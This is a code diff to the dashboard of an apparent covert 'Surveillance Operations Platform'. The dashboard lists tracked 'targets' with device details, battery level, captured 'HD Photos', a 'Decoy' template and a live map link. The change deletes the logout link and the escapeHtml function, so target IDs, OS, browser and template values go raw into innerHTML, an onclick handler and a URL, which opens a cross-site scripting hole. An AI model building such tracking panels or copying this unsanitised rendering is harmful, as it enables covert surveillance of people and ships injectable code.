@@ -352,14 +352,9 @@
                 <p>Surveillance Operations Platform • HD Snapshots & Telemetry</p>
             </div>
         </div>
-        <div style="display: flex; align-items: center; gap: 12px;">
-            <div class="server-status">
-                <div class="status-dot"></div>
-                <span>System Active</span>
-            </div>
-            <a href="/logout" class="btn btn-secondary" style="font-size: 13px; padding: 6px 12px; text-decoration: none;">
-                <i class="fas fa-right-from-bracket"></i> Logout
-            </a>
+        <div class="server-status">
+            <div class="status-dot"></div>
+            <span>System Active</span>
         </div>
     </header>
 
@@ -565,16 +560,6 @@
             }
         }
 
-        function escapeHtml(str) {
-            if (str === null || str === undefined) return '';
-            return String(str)
-                .replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;')
-                .replace(/"/g, '&quot;')
-                .replace(/'/g, '&#039;');
-        }
-
         function renderTargets(targets) {
             const keys = Object.keys(targets);
             targetCountBadge.innerText = `${keys.length} Target${keys.length === 1 ? '' : 's'}`;
@@ -608,35 +593,30 @@
                 // Device info
                 const os = target.device ? target.device.os : 'Device';
                 const browser = target.device ? target.device.browser : '';
-                const photoCount = target.photosCount !== undefined ? target.photosCount : (target.photos ? target.photos.length : 0);
-
-                const cleanId = escapeHtml(target.id);
-                const cleanOs = escapeHtml(os);
-                const cleanBrowser = escapeHtml(browser);
-                const cleanTemplate = escapeHtml(target.template || 'Decoy');
+                const photoCount = target.photos ? target.photos.length : 0;
 
                 card.innerHTML = `
                     <div class="target-main-info">
                         <div class="target-avatar">
-                            <i class="fas ${cleanOs.toLowerCase().includes('android') || cleanOs.toLowerCase().includes('ios') ? 'fa-mobile-screen' : 'fa-laptop'}"></i>
+                            <i class="fas ${os.toLowerCase().includes('android') || os.toLowerCase().includes('ios') ? 'fa-mobile-screen' : 'fa-laptop'}"></i>
                         </div>
                         <div>
                             <div class="target-id">
-                                ID: ${cleanId}
-                                <span class="badge-template">${cleanTemplate}</span>
+                                ID: ${target.id}
+                                <span class="badge-template">${target.template || 'Decoy'}</span>
                             </div>
                             <div class="target-meta">
                                 ${batteryHTML}
-                                <span><i class="fas fa-desktop"></i> ${cleanOs} • ${cleanBrowser}</span>
+                                <span><i class="fas fa-desktop"></i> ${os} • ${browser}</span>
                                 <span><i class="fas fa-camera"></i> ${photoCount} HD Photos</span>
                             </div>
                         </div>
                     </div>
                     <div style="display: flex; gap: 8px;">
-                        <a href="/map?id=${encodeURIComponent(target.id)}" class="btn btn-primary">
+                        <a href="/map?id=${target.id}" class="btn btn-primary">
                             <i class="fas fa-map-location-dot"></i> Live Map & Photos
                         </a>
-                        <button onclick="deleteTarget('${cleanId}')" class="btn btn-danger" title="Delete Target">
+                        <button onclick="deleteTarget('${target.id}')" class="btn btn-danger" title="Delete Target">
                             <i class="fas fa-trash"></i>
                         </button>
                     </div>
